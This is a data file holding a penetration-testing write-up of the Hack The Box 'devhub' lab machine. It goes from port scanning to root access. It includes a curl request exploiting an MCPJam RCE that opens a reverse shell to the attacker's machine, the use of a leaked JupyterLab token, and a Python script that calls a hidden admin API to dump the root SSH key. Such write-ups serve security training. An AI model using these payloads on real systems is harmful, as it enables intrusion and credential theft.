@@ -1,0 +1,312 @@
+{
+  "slug": "devhub",
+  "title": "Hack The Box devhub — Full Writeup",
+  "description": "A complete step-by-step penetration testing walkthrough of the HTB devhub machine.",
+  "category": "WRITEUP",
+  "author": {
+    "name": "Hamza khairi",
+    "initials": "HK"
+  },
+  "date": "2026-09-26",
+  "readTime": "10 min read",
+  "tags": [
+    "HTB",
+    "Devhub",
+    "Linux",
+    "Medium",
+    "Web",
+    "Privilege Escalation"
+  ],
+  "cover": "/HTB/devhub/devhub.png",
+  "box": {
+    "os": "Linux",
+    "difficulty": "Medium",
+    "points": 30,
+    "released": "2026-09-26"
+  },
+  "sections": [
+    {
+      "title": "Enumeration",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "I started by checking whether the target machine was reachable using ping before moving on to port and service enumeration."
+        },
+        {
+          "type": "command",
+          "command": "ping -c 4 10.129.120.169",
+          "output": "Successful ICMP replies received. TTL=63."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/ping-1.png",
+          "alt": "Ping results showing successful connectivity to the target machine",
+          "caption": "Initial connectivity check. The target responds with a TTL value of 63."
+        },
+        {
+          "type": "paragraph",
+          "text": "After confirming connectivity, I launched an Nmap scan to enumerate all TCP ports, identify running services and their versions, and run the default NSE scripts."
+        },
+        {
+          "type": "command",
+          "command": "nmap -sS -sC -sV -p- -oN nmap/nmap.txt 10.129.120.169",
+          "output": "See the Nmap scan screenshot for the discovered ports and services."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/scan-2.png",
+          "alt": "Nmap full TCP port scan results for the DevHub target",
+          "caption": "The scan revealed three open TCP ports: 22 (SSH), 80 (HTTP), and 6274 (HTTP). I decided to investigate both web services to discover what they host."
+        }
+      ]
+    },
+    {
+      "title": "Web Enumeration",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "After identifying the open ports, I started investigating the two HTTP services to discover what was running on each one."
+        },
+        {
+          "type": "heading",
+          "text": "Web Enumeration — Port 80"
+        },
+        {
+          "type": "paragraph",
+          "text": "I opened the web application hosted on port 80 and explored the available pages. I didn't find anything particularly interesting during this initial inspection, so I moved on to the second web service."
+        },
+        {
+          "type": "heading",
+          "text": "Web Enumeration — Port 6274"
+        },
+        {
+          "type": "paragraph",
+          "text": "Next, I accessed the HTTP service on port 6274. This time, I discovered MCPJam, running version v1.4.2. This gave me a specific application and version to investigate further."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/descover-website-3.png",
+          "alt": "MCPJam web interface running on port 6274",
+          "caption": "MCPJam web interface identifying version v1.4.2."
+        }
+      ]
+    },
+    {
+      "title": "Initial Access",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "After identifying MCPJam v1.4.2 on port 6274, I searched for publicly documented vulnerabilities affecting the application. During this research, I found CVE-2026-23744 and a GitHub post describing an RCE vulnerability relevant to MCPJam."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/cve-2026-23744-4.png",
+          "alt": "GitHub post documenting the MCPJam remote code execution vulnerability",
+          "caption": "GitHub research identifying CVE-2026-23744 and the reported RCE vulnerability."
+        },
+        {
+          "type": "paragraph",
+          "text": "Based on this research, I tested the exposed MCP connection endpoint by sending a crafted JSON request. The request supplied /bin/bash as the command and used it to execute a reverse shell back to my attacking machine."
+        },
+        {
+          "type": "command",
+          "command": "curl http://devhub.htb:6274/api/mcp/connect --header \"Content-Type: application/json\" --data '{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"/bin/bash -i >& /dev/tcp/IP/9090 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}'",
+          "output": "The request triggered command execution and established a reverse shell."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/netcat-5.png",
+          "alt": "Terminal showing the successful reverse shell connection",
+          "caption": "Initial access obtained through remote command execution in MCPJam."
+        },
+        {
+          "type": "paragraph",
+          "text": "The reverse shell provided my initial foothold on the target machine. With access established, I could begin investigating the local environment and looking for a path to privilege escalation."
+        }
+      ]
+    },
+    {
+      "title": "Shell Stabilization",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "The initial shell was unstable, so I upgraded it to a proper interactive shell."
+        },
+        {
+          "type": "command",
+          "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+        },
+        {
+          "type": "command",
+          "command": "export TERM=xterm"
+        },
+        {
+          "type": "paragraph",
+          "text": "The shell was now much easier to work with."
+        }
+      ]
+    },
+    {
+      "title": "User Enumeration",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "After obtaining the initial foothold, I started looking for the user flag and exploring the local environment. I checked the home directory and discovered another user's directory, but I didn't have permission to access it directly."
+        },
+        {
+          "type": "paragraph",
+          "text": "Instead of trying to access the directory directly, I decided to investigate the processes running under that user's account to identify any services or applications that might provide another way forward."
+        },
+        {
+          "type": "command",
+          "command": "ps aux | grep analys",
+          "output": "JupyterLab was running under the analyst user's account on port 8888."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/enum-inside-mcp-dev-user-real-6.png",
+          "alt": "Process listing showing JupyterLab running under the analyst user",
+          "caption": "Process enumeration revealed a JupyterLab instance associated with the analyst user."
+        },
+        {
+          "type": "paragraph",
+          "text": "The discovery of JupyterLab running on port 8888 caught my attention. I decided to investigate whether I could access the service through SSH port forwarding and inspect its interface from my local browser."
+        },
+        {
+          "type": "heading",
+          "text": "Accessing JupyterLab Through SSH Tunneling"
+        },
+        {
+          "type": "paragraph",
+          "text": "I set up an SSH tunnel to forward the remote port 8888 to my local machine. This would allow me to access the JupyterLab web interface through localhost in my browser, without exposing the service directly to the network."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/tunneling-7.png",
+          "alt": "Process listing showing JupyterLab running under the analyst user",
+          "caption": ""
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/descover-website-analys-8.png",
+          "alt": "JupyterLab interface accessed through a local SSH tunnel",
+          "caption": "JupyterLab accessed locally through SSH port forwarding."
+        }
+      ]
+    },
+    {
+      "title": "User Access",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "When I accessed the JupyterLab interface through the SSH tunnel, I was prompted to provide an authentication token. Looking back at the user enumeration results, I noticed that the JupyterLab command line exposed the token in the process arguments."
+        },
+        {
+          "type": "paragraph",
+          "text": "I extracted the token from the previously identified process information and used it to authenticate to JupyterLab. This allowed me to access the running instance associated with the analyst user."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/after-login-get-user-flag-9.png",
+          "alt": "Authenticated JupyterLab session running as analyst",
+          "caption": "Successful authentication provided access to the JupyterLab session."
+        },
+        {
+          "type": "paragraph",
+          "text": "With access to the JupyterLab session, I obtained a shell in the analyst user's context and located the user flag, completing the user-level objective."
+        },
+        {
+          "type": "paragraph",
+          "text": "User flag obtained after gaining access to the analyst session."
+        }
+      ]
+    },
+    {
+      "title": "Privilege Escalation — Root",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "After obtaining the user flag as analyst, I continued enumerating the machine to identify potential privilege escalation paths. I discovered an internal Flask application listening on port 5000 and inspected its source code at /opt/opsmcp/server.py."
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/enum-inside-mcp-dev-user-real-6.png",
+          "alt": "Source code of the OPSMCP Flask application",
+          "caption": "Inspecting the OPSMCP source code revealed hidden administrative tools."
+        },
+        {
+          "type": "paragraph",
+          "text": "The application contained two hidden tools, ops._debug_mode and ops._admin_dump, that were callable through the API despite being excluded from the public tool listing. The administrative dump function could return sensitive credentials, including the root user's SSH private key, when called with the appropriate arguments."
+        },
+        {
+          "type": "heading",
+          "text": "Exploiting the Hidden Administrative Tool"
+        },
+        {
+          "type": "paragraph",
+          "text": "After identifying the exposed functionality and the API key in the source code, I wrote a short Python script using the requests library to invoke ops._admin_dump. By specifying ssh_keys as the target and setting confirm to true, I was able to retrieve the root SSH private key."
+        },
+        {
+          "type": "code",
+          "language": "shell",
+          "code": "import requests\n\nBASE_URL = \"http://127.0.0.1:5000\"\nAPI_KEY = \"opsmcp_secret_key_4f5a6b7c8d9e0f1a\"\n\nsession = requests.Session()\nsession.headers.update({\n    \"X-API-Key\": API_KEY,\n    \"Content-Type\": \"application/json\",\n})\n\nresponse = session.post(\n    f\"{BASE_URL}/tools/call\",\n    json={\n        \"name\": \"ops._admin_dump\",\n        \"arguments\": {\n            \"target\": \"ssh_keys\",\n            \"confirm\": True\n        },\n    },\n    timeout=5,\n)\nprint(\"[+] Debug response:\", response.status_code)\nprint(response.text)"
+        },
+        {
+          "type": "heading",
+          "text": "Root Access via SSH"
+        },
+        {
+          "type": "paragraph",
+          "text": "I saved the retrieved private key to a local file and restricted its permissions to ensure SSH would accept it."
+        },
+        {
+          "type": "command",
+          "command": "chmod 600 root_key"
+        },
+        {
+          "type": "paragraph",
+          "text": "I then used the recovered private key to authenticate to the target as root over SSH, gaining full administrative access."
+        },
+        {
+          "type": "command",
+          "command": "ssh -i root_key root@devhub.htb"
+        },
+        {
+          "type": "image",
+          "src": "/HTB/devhub/root-10.png",
+          "alt": "Successful SSH session as root",
+          "caption": "Root shell obtained using the recovered SSH private key."
+        },
+        {
+          "type": "paragraph",
+          "text": "Finally, I located and retrieved the root flag, completing the DevHub machine."
+        },
+        {
+          "type": "paragraph",
+          "text": "Successfully retrieved the root flag."
+        }
+      ]
+    },
+    {
+      "title": "Final Thoughts",
+      "blocks": [
+        {
+          "type": "paragraph",
+          "text": "DevHub was a good example of how web enumeration can lead to remote code execution, user access, and ultimately root privileges. The machine highlighted the importance of investigating exposed services, reviewing application source code, and examining local processes for potential privilege escalation paths."
+        },
+        {
+          "type": "list",
+          "items": [
+            "Enumerate every exposed service and investigate unusual ports.",
+            "Research application versions and verify potentially relevant CVEs.",
+            "Inspect running processes for exposed tokens and sensitive information.",
+            "Investigate internal services and use SSH port forwarding when appropriate.",
+            "Review source code for hidden API functionality and insecure credential handling.",
+            "Understand how exposed SSH private keys can lead to privilege escalation.",
+            "Secure sensitive credentials and avoid exposing secrets in process arguments or API responses."
+          ]
+        }
+      ]
+    }
+  ]
+}
